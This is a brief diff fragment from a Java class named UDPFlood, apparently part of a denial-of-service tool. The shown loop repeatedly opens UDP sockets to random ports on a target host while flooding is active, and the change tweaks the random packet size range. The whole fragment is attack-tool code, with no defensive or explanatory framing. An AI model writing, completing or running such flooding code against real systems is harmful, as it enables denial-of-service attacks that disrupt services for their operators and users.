@@ -26,7 +26,7 @@ public class UDPFlood extends Flood {
 		
 		while(Flood.isFlooding()) {
 			try {
-				int packetSize = (int)(Math.random() * (735 - 100)) + 50;
+				int packetSize = (int)(Math.random() * (735 - 64)) + 64;
 				udpPort = rand.nextInt(65536);
 				socket = new DatagramSocket();
 				socket.connect(InetAddress.getByName(super.getTarget()), udpPort);
